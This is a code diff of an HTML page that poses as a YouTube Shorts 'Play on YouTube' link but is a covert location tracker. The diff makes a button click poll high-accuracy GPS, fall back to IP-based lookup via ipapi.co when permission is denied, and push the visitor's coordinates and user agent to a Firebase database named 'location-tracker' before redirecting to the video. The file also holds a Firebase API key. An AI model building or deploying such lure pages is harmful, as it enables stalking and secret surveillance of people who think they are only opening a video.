@@ -3,68 +3,26 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>YouTube Shorts - Play Video</title>
+  <title>YouTube Shorts - Accurate Location</title>
 
   <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 
-  <!-- UAParser.js -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>
-
   <style>
-    body { 
-      display: flex; 
-      flex-direction: column; 
-      align-items: center; 
-      justify-content: center; 
-      height: 100vh; 
-      font-family: Arial, sans-serif; 
-      text-align: center; 
-      background: #f9f9f9;
-      margin: 0;
-      padding: 20px;
-    }
-    h2 { margin-bottom: 15px; }
-    img { width: 320px; border-radius: 12px; margin-bottom: 10px; }
-    p { max-width: 320px; font-size: 16px; color: #333; margin-bottom: 15px; }
-    button { 
-      padding: 12px 20px; 
-      font-size: 18px; 
-      font-weight: bold; 
-      color: white; 
-      background: #ff0000; 
-      border: none; 
-      border-radius: 8px; 
-      cursor: pointer; 
-      transition: background 0.3s ease;
-    }
-    button:hover { background: #cc0000; }
+    body { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: Arial; text-align: center; }
+    button { padding: 12px 20px; font-size: 18px; font-weight: bold; color: white; background: #ff0000; border: none; border-radius: 8px; cursor: pointer; }
     #status { margin-top: 15px; font-size: 16px; font-weight: bold; color: #007bff; }
-    #error { margin-top: 15px; font-size: 16px; font-weight: bold; color: red; }
   </style>
 </head>
 <body>
   <h2>Watch on YouTube</h2>
-
-  <!-- Thumbnail -->
-  <img id="thumbnail" src="https://img.youtube.com/vi/KedF7uEjiTs/hqdefault.jpg" 
-       alt="Video Thumbnail">
-
-  <!-- Description -->
-  <p>
-    This is an awesome YouTube Short video. Click play to watch it directly on YouTube.
-  </p>
-
-  <!-- Play Button -->
   <button id="playBtn">▶️ Play on YouTube</button>
   <p id="status"></p>
-  <p id="error"></p>
 
   <script>
     const youtubeLink = "https://www.youtube.com/shorts/KedF7uEjiTs";
 
-    // Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyBlvUQ7EpySZ-4lvbWuKOan7XSrNvTHIq8",
       authDomain: "location-tracker-d10ec.firebaseapp.com",
@@ -80,64 +38,72 @@
 
     const playBtn = document.getElementById("playBtn");
     const statusEl = document.getElementById("status");
-    const errorEl = document.getElementById("error");
 
-    // Device info
-    function getDeviceInfo() {
-      const parser = new UAParser();
-      const result = parser.getResult();
-      return {
-        device: result.device.model || "Unknown Device",
-        brand: result.device.vendor || "Unknown Brand",
-        os: result.os.name + " " + (result.os.version || ""),
-        browser: result.browser.name + " " + (result.browser.version || "")
-      };
-    }
-
-    // Save event
-    function saveEvent(extra = {}) {
-      const deviceInfo = getDeviceInfo();
+    function saveLocation(lat, lon, accuracy) {
       const payload = {
         event: "button_clicked",
         timestamp: new Date().toLocaleString(),
         userAgent: navigator.userAgent,
-        videoUrl: youtubeLink,
-        device: deviceInfo.device,
-        brand: deviceInfo.brand,
-        os: deviceInfo.os,
-        browser: deviceInfo.browser,
-        ...extra
+        latitude: lat,
+        longitude: lon,
+        accuracy: accuracy,
+        videoUrl: youtubeLink
       };
       return database.ref("visitors").push(payload);
     }
 
-    // Handle button click
-    playBtn.addEventListener("click", () => {
-      statusEl.textContent = "🎬 Your video is playing in 3 seconds...";
-      errorEl.textContent = "";
+    async function getIPLocation() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        return {
+          latitude: data.latitude || "N/A",
+          longitude: data.longitude || "N/A",
+          accuracy: "IP-based"
+        };
+      } catch {
+        return { latitude: "N/A", longitude: "N/A", accuracy: "unknown" };
+      }
+    }
 
+    playBtn.addEventListener("click", () => {
+      statusEl.textContent = "🎬 Video will play in 3 seconds...";
+      
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
+        let attempts = 0;
+        const maxAttempts = 5;
+
+        const watchId = navigator.geolocation.watchPosition(
           async (pos) => {
-            await saveEvent({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy: pos.coords.accuracy
-            });
-            setTimeout(() => window.location.href = youtubeLink, 3000);
+            attempts++;
+            console.log(`Attempt ${attempts}: Accuracy = ${pos.coords.accuracy} meters`);
+            statusEl.textContent = `🎯 GPS accuracy: ${Math.round(pos.coords.accuracy)}m`;
+
+            // Check if accuracy is acceptable or max attempts reached
+            if (pos.coords.accuracy <= 100 || attempts >= maxAttempts) {
+              navigator.geolocation.clearWatch(watchId);
+              await saveLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+              statusEl.textContent = "✅ Location saved! Video will play in 3 seconds...";
+              setTimeout(() => { window.location.href = youtubeLink; }, 3000);
+            }
           },
-          async (err) => {
-            await saveEvent({ error: err.message });
-            statusEl.textContent = "";
-            errorEl.textContent = "❌ Refresh the page.";
-            // ⚠️ Do NOT redirect if denied (user must refresh)
+          async () => {
+            // Permission denied or error → fallback to IP
+            const ipLoc = await getIPLocation();
+            await saveLocation(ipLoc.latitude, ipLoc.longitude, ipLoc.accuracy);
+            statusEl.textContent = "⚠️ Permission denied or GPS unavailable. Video will play in 3 seconds...";
+            setTimeout(() => { window.location.href = youtubeLink; }, 3000);
           },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
+
       } else {
-        saveEvent({ error: "Geolocation not supported" });
-        statusEl.textContent = "";
-        errorEl.textContent = "❌ Your browser does not support location access.";
+        // Browser does not support geolocation → fallback to IP
+        getIPLocation().then(ipLoc => {
+          saveLocation(ipLoc.latitude, ipLoc.longitude, ipLoc.accuracy);
+          statusEl.textContent = "⚠️ Geolocation not supported. Video will play in 3 seconds...";
+          setTimeout(() => { window.location.href = youtubeLink; }, 3000);
+        });
       }
     });
   </script>
